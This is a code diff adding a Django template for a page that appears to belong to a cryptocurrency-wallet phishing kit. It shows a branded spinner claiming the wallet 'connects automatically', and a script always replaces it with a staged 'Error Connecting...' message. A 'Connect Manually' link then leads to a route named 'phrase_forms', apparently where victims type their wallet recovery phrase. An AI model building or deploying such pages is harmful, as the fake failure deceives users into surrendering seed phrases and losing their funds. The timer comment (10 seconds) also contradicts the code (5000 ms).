@@ -1,0 +1,151 @@
+{% extends "partials/base.html" %}
+{% load static %}
+{% block content %}
+
+    <!--  -->
+    <div class="pt-55 pb-80">
+        <div class="tf-container">
+
+            <div class="mt-20">
+                
+                <div class="tab-content mt-8 mb-16">
+
+                    <!-- <div class="tab-pane fade show active" id="all" role="tabpanel">
+
+                        <ul class="mt-16">
+                            <li>
+                                <a href="choose-payment.html" class="coin-item style-2 gap-12">
+                                    <img src="images/coin/coin-6.jpg" alt="img" class="img">
+                                    <div class="content">
+                                        <div class="title">
+                                            <p class="mb-4 text-button">{{connect_error.title}}</p>
+                                            <span class="text-secondary">$361,6M</span>
+                                        </div>
+                                        <div class="d-flex align-items-center gap-12">
+                                            <span class="text-small">$1.878,80</span>
+                                            <span class="coin-btn decrease">-1,62%</span>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            
+                        </ul>  
+                    </div> -->
+
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    
+    <style>
+        /* Center everything */
+        /*body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #121212;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }*/
+
+        /* Spinner style */
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-top: 2px solid #635733;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin-top: 1rem;
+        }
+
+        @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+        }
+
+        /* Hidden elements */
+        .hidden {
+            display: none;
+        }
+
+        /* Button style */
+        button {
+            margin-top: 20px;
+            padding: 12px 24px;
+            font-size: 16px;
+            background-color: #00bfff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        /* Fade-in animation */
+        .fade-in {
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+    </style>
+
+    
+    <div class="container d-flex justify-content-center" style="">
+        
+        <div class="form-container text-center p-3" style="border-radius: 5px; background-color: #fff; width: 250px; height: 350px;">
+
+            <div class="form-header d-flex justify-content-center" style="margin-bottom: 20px;">
+                <img src="{{ connect_error.image.url }}" alt="{{connect_error.title}}" style="width: 100px;" >
+            </div>
+
+            <p class="mt-1" style="font-size: 15px; margin-bottom: 30px;">
+                <span style="background-color: rgb(214, 212, 212); font-size: 12px; color: #000; padding: 5px; border-radius: 15px;">{{connect_error.title}} <br></span>
+            </p>
+            
+            <!-- Easy to use browser extension.  -->
+            
+            <p style="margin-bottom: 10px;">Please wait while <span style="color: rgb(153, 138, 4);">{{connect_error.title}}</span> connects automatically. </p>
+
+            <div class=" d-flex justify-content-center">
+                <div id="spinner" class="spinner"></div>
+            </div>            
+
+            <!-- Optionally, display a countdown -->
+            <p id="message" class="hidden mt-8 text-danger" style="margin-bottom: 10px;"> Error Connecting...</p>
+            
+            <p style="margin-top: 1rem; " id="myButton" class="hidden"> 
+                <a style="color: #000; background-color: rgb(214, 212, 212); font-size: 10px; padding: 5px; border-radius: 15px;" href="{% url 'core:phrase_forms'  %}">
+                    Connect Maually 
+                </a>
+            </p>
+                
+            
+        </div>
+    </div>
+
+
+    <script>
+        // Wait 10 seconds before showing message and button
+        setTimeout(() => {
+        // Hide spinner
+        document.getElementById("spinner").classList.add("hidden");
+
+        // Show message and button with fade-in effect
+        const message = document.getElementById("message");
+        const button = document.getElementById("myButton");
+        message.classList.remove("hidden");
+        button.classList.remove("hidden");
+        message.classList.add("fade-in");
+        button.classList.add("fade-in");
+        }, 5000); // 10 seconds (10000ms)
+    </script>
+
+
+{% endblock %}
